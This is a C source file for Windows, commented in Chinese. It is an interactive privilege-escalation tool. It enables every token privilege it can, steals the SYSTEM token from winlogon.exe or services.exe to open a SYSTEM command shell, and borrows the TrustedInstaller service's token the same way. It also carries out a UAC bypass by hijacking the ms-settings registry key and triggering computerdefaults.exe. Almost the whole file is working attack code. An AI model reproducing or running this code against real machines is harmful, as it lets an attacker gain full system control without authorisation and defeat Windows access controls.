#include <windows.h>
#include <tlhelp32.h>
#include <winsvc.h>
#include <shellapi.h>
#include <ShlObj.h>
#include <stdio.h>
#include <locale.h>
#include <wchar.h>

#pragma warning(disable:4996)


#pragma execution_character_set("utf-8")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Shell32.lib")


// 简单获取进程ID（按名称，ANSI）
DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}

// 提升当前进程的多种权限
BOOL EnableMultiplePrivileges() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("无法打开进程令牌, 错误代码: %lu\n", GetLastError());
        return FALSE;
    }

    const char* privileges[] = {
        SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_ASSIGNPRIMARYTOKEN_NAME,
        SE_TCB_NAME, SE_SECURITY_NAME, SE_TAKE_OWNERSHIP_NAME,
        SE_LOAD_DRIVER_NAME, SE_SYSTEM_PROFILE_NAME, SE_SYSTEMTIME_NAME,
        SE_PROF_SINGLE_PROCESS_NAME, SE_INC_BASE_PRIORITY_NAME,
        SE_CREATE_PAGEFILE_NAME, SE_SHUTDOWN_NAME, SE_RESTORE_NAME,
        SE_BACKUP_NAME, SE_CREATE_TOKEN_NAME, SE_LOCK_MEMORY_NAME,
        SE_INCREASE_QUOTA_NAME, SE_CREATE_PERMANENT_NAME, SE_AUDIT_NAME,
        SE_SYSTEM_ENVIRONMENT_NAME, SE_CHANGE_NOTIFY_NAME, SE_UNDOCK_NAME,
        SE_MANAGE_VOLUME_NAME, SE_CREATE_GLOBAL_NAME, SE_TRUSTED_CREDMAN_ACCESS_NAME,
        SE_RELABEL_NAME, SE_INC_WORKING_SET_NAME, SE_TIME_ZONE_NAME,
        SE_CREATE_SYMBOLIC_LINK_NAME, SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
    };

    int successCount = 0;
    int totalCount = sizeof(privileges) / sizeof(privileges[0]);

    for (int i = 0; i < totalCount; i++) {
        LUID luid;
        if (LookupPrivilegeValueA(NULL, privileges[i], &luid)) {
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                if (GetLastError() == ERROR_SUCCESS) successCount++;
            }
        }
    }

    CloseHandle(hToken);
    printf("成功启用 %d 个特权 (总尝试 %d)\n", successCount, totalCount);
    return successCount > 0;
}


// 检测是否是管理员
BOOL IsAdmin() {
    return IsUserAnAdmin();
}

// 以管理员身份重启自身
BOOL RelaunchAsAdmin() {
    wchar_t path[MAX_PATH];
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    HINSTANCE h = ShellExecuteW(NULL, L"runas", path, NULL, NULL, SW_SHOWNORMAL);
    return (UINT_PTR)h > 32;
}

// 在指定令牌上启用所有特权
BOOL EnableAllPrivilegesOnToken(HANDLE hToken) {
    const char* privileges[] = {
        SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_ASSIGNPRIMARYTOKEN_NAME,
        SE_TCB_NAME, SE_SECURITY_NAME, SE_TAKE_OWNERSHIP_NAME,
        SE_LOAD_DRIVER_NAME, SE_SYSTEM_PROFILE_NAME, SE_SYSTEMTIME_NAME,
        SE_PROF_SINGLE_PROCESS_NAME, SE_INC_BASE_PRIORITY_NAME,
        SE_CREATE_PAGEFILE_NAME, SE_SHUTDOWN_NAME, SE_RESTORE_NAME,
        SE_BACKUP_NAME, SE_CREATE_TOKEN_NAME, SE_LOCK_MEMORY_NAME,
        SE_INCREASE_QUOTA_NAME, SE_CREATE_PERMANENT_NAME, SE_AUDIT_NAME,
        SE_SYSTEM_ENVIRONMENT_NAME, SE_CHANGE_NOTIFY_NAME, SE_UNDOCK_NAME,
        SE_MANAGE_VOLUME_NAME, SE_CREATE_GLOBAL_NAME, SE_TRUSTED_CREDMAN_ACCESS_NAME,
        SE_RELABEL_NAME, SE_INC_WORKING_SET_NAME, SE_TIME_ZONE_NAME,
        SE_CREATE_SYMBOLIC_LINK_NAME, SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
    };

    int successCount = 0;
    int totalCount = sizeof(privileges) / sizeof(privileges[0]);

    for (int i = 0; i < totalCount; i++) {
        LUID luid;
        if (LookupPrivilegeValueA(NULL, privileges[i], &luid)) {
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                if (GetLastError() == ERROR_SUCCESS) successCount++;
            }
        }
    }

    printf("在目标令牌上成功启用 %d/%d 个特权\n", successCount, totalCount);
    return successCount > 0;
}

// 通过指定 PID 的进程 Token 启动 CMD
BOOL LaunchCmdWithTokenFromPid(DWORD pid, const wchar_t* title) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        printf("无法打开进程 PID=%lu, 错误: %lu\n", pid, GetLastError());
        return FALSE;
    }

    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTok)) {
        printf("无法打开进程令牌, 错误: %lu\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hTok,
                          TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                          NULL,
                          SecurityImpersonation,
                          TokenPrimary,
                          &hDup)) {
        printf("无法复制令牌, 错误: %lu\n", GetLastError());
        CloseHandle(hTok);
        CloseHandle(hProc);
        return FALSE;
    }

    // 在复制的令牌上启用所有可用特权
    EnableAllPrivilegesOnToken(hDup);

    wchar_t cmdLine[256];
    swprintf_s(cmdLine, sizeof(cmdLine) / sizeof(cmdLine[0]), L"cmd.exe /K title %ls & echo 当前身份: & whoami /priv", title);

    STARTUPINFOW si = { 0 };

    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    BOOL ok = CreateProcessWithTokenW(
        hDup,
        LOGON_WITH_PROFILE,
        NULL,
        cmdLine,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!ok) {
        printf("CreateProcessWithTokenW 失败: %lu\n", GetLastError());
    } else {
        printf("已启动 CMD (PID: %lu)，请在新窗口中查看特权状态\n", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    CloseHandle(hDup);
    CloseHandle(hTok);
    CloseHandle(hProc);
    return ok;
}

BOOL LaunchCmdAsSystem() {
    // 优先 winlogon.exe，其次 services.exe
    DWORD pid = GetProcessIdByName("winlogon.exe");
    if (pid == 0) pid = GetProcessIdByName("services.exe");
    if (pid == 0) {
        printf("未找到 winlogon/services，无法获取 SYSTEM 令牌\n");
        return FALSE;
    }
    printf("尝试使用 PID=%lu 的 SYSTEM 令牌\n", pid);
    return LaunchCmdWithTokenFromPid(pid, L"SYSTEM CMD");
}

// 模拟 SYSTEM（从 winlogon/services 复制 primary token 并 ImpersonateLoggedOnUser）
BOOL ImpersonateSystem() {
    DWORD pid = GetProcessIdByName("winlogon.exe");
    if (pid == 0) pid = GetProcessIdByName("services.exe");
    if (pid == 0) {
        printf("未找到 winlogon/services，无法获取 SYSTEM 令牌进行模拟\n");
        return FALSE;
    }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        printf("无法打开 SYSTEM 进程 (PID=%lu)，错误: %lu\n", pid, GetLastError());
        return FALSE;
    }

    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        printf("无法打开 SYSTEM 令牌，错误: %lu\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hTok,
                          TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                          NULL,
                          SecurityImpersonation,
                          TokenImpersonation,
                          &hDup)) {
        printf("复制 SYSTEM 令牌失败，错误: %lu\n", GetLastError());
        CloseHandle(hTok);
        CloseHandle(hProc);
        return FALSE;
    }

    BOOL ok = ImpersonateLoggedOnUser(hDup);
    if (!ok) {
        printf("ImpersonateLoggedOnUser 失败，错误: %lu\n", GetLastError());
    } else {
        printf("已模拟 SYSTEM 身份用于后续操作\n");
    }

    CloseHandle(hDup);
    CloseHandle(hTok);
    CloseHandle(hProc);
    return ok;
}

void RevertImpersonationIfNeeded() {
    RevertToSelf();
}

// 运行一条命令（隐藏窗口，等待结束）
BOOL RunCmdHidden(const wchar_t* cmdLine, const wchar_t* label) {
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    wchar_t buf[1400];
    wcsncpy_s(buf, sizeof(buf)/sizeof(buf[0]), cmdLine, _TRUNCATE);

    BOOL ok = CreateProcessW(
        NULL,
        buf,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!ok) {
        wprintf(L"%ls 失败, 错误: %lu\n", label, GetLastError());
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    wprintf(L"%ls 退出码: %lu\n", label, exitCode);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return exitCode == 0;
}

// 应用 ms-settings 劫持注册表（指向本程序）并触发
BOOL ApplyMsSettingsHijackAndTrigger() {
    wchar_t exePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
        printf("无法获取当前程序路径\n");
        return FALSE;
    }

    wchar_t cmd[2048];
    // 写入命令键值，指向本程序路径
    swprintf_s(cmd, sizeof(cmd)/sizeof(cmd[0]), L"cmd.exe /C reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /d \"%ls\" /f", exePath);
    RunCmdHidden(cmd, L"劫持注册表 - 命令键值");

    // 写入 DelegateExecute
    RunCmdHidden(L"cmd.exe /C reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /f", L"劫持注册表 - DelegateExecute");

    printf("注册表劫持已完成，正在通过 computerdefaults.exe 触发...\n");
    
    // 触发 UAC 绕过
    RunCmdHidden(L"cmd.exe /C start computerdefaults.exe", L"启动触发程序");
    
    return TRUE;
}


BOOL StartTrustedInstallerServiceAndGetPid(DWORD* outPid) {


    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return FALSE;
    SC_HANDLE svc = OpenServiceW(scm, L"TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);
    if (!svc) { CloseServiceHandle(scm); return FALSE; }

    SERVICE_STATUS_PROCESS ssp;
    DWORD needed = 0;
    if (!QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
        CloseServiceHandle(svc); CloseServiceHandle(scm); return FALSE;
    }

    if (ssp.dwCurrentState != SERVICE_RUNNING) {
        StartServiceW(svc, 0, NULL);
        // 等待启动
        for (int i = 0; i < 20; i++) {
            Sleep(200);
            if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                if (ssp.dwCurrentState == SERVICE_RUNNING) break;
            }
        }
    }

    BOOL ok = FALSE;
    if (ssp.dwCurrentState == SERVICE_RUNNING && ssp.dwProcessId != 0) {
        *outPid = ssp.dwProcessId;
        ok = TRUE;
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

BOOL LaunchCmdAsTrustedInstaller() {
    // 先尝试模拟 SYSTEM，再去访问 TI 令牌
    BOOL impOk = ImpersonateSystem();
    if (!impOk) {
        printf("未能模拟 SYSTEM，可能无法访问 TrustedInstaller 令牌\n");
    }

    DWORD tiPid = 0;
    if (!StartTrustedInstallerServiceAndGetPid(&tiPid)) {
        printf("无法获取 TrustedInstaller PID，可能缺少权限或服务不存在\n");
        if (impOk) RevertImpersonationIfNeeded();
        return FALSE;
    }
    printf("尝试使用 TrustedInstaller (PID=%lu) 令牌\n", tiPid);
    BOOL ok = LaunchCmdWithTokenFromPid(tiPid, L"TI CMD");

    if (impOk) RevertImpersonationIfNeeded();
    return ok;
}


BOOL LaunchCmdAsCurrentToken(const wchar_t* title) {
    wchar_t cmdLine[256];
    swprintf_s(cmdLine, sizeof(cmdLine) / sizeof(cmdLine[0]), L"cmd.exe /K title %ls & echo 当前身份: & whoami /groups", title);

    STARTUPINFOW si = {0};

    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    BOOL ok = CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (ok) {
        printf("已启动 CMD (PID: %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        printf("启动 CMD 失败: %lu\n", GetLastError());
    }
    return ok;
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    setlocale(LC_ALL, ".UTF-8");

    printf("===== 提权并启动 CMD =====\n\n");

    // 提升可用权限
    EnableMultiplePrivileges();

    printf("选择要启动的权限级别/动作:\n");
    printf("  1) Administrator 管理员 CMD\n");
    printf("  2) SYSTEM CMD\n");
    printf("  3) TrustedInstaller\n");
    printf("  4) UAC Bypass\n");
    printf("请输入选项(1/2/3/4): ");



    int choice = 0;
    if (scanf("%d", &choice) != 1) return 0;
    int ch; while ((ch = getchar()) != '\n' && ch != EOF) {}

    switch (choice) {
    case 1: {
        if (IsAdmin()) {
            printf("当前已是管理员，直接启动管理员 CMD...\n");
            LaunchCmdAsCurrentToken(L"Admin CMD");
        } else {
            printf("尝试以管理员身份重启程序...\n");
            RelaunchAsAdmin();
        }
        break;
    }
    case 2:
        printf("尝试启动 SYSTEM CMD...\n");
        if (!LaunchCmdAsSystem()) {
            printf("启动 SYSTEM CMD 失败，确认已在管理员 CMD 中运行且已启用调试权限\n");
        }
        break;
    case 3:
        printf("尝试启动 TrustedInstaller CMD...\n");
        if (!LaunchCmdAsTrustedInstaller()) {
            printf("启动 TI CMD 失败，确认已在管理员 CMD 中运行且已启用调试/模拟权限\n");
        }
        break;
    case 4:
        printf("正在执行 UAC Bypass 逻辑...\n");
        if (ApplyMsSettingsHijackAndTrigger()) {
            printf("触发成功！如果绕过生效，会弹出一个具有管理员权限的新实例。\n");
        }
        break;

    default:
        printf("无效选项\n");
        break;
    }


    printf("\n按回车退出本工具...\n");
    getchar();
    return 0;
}
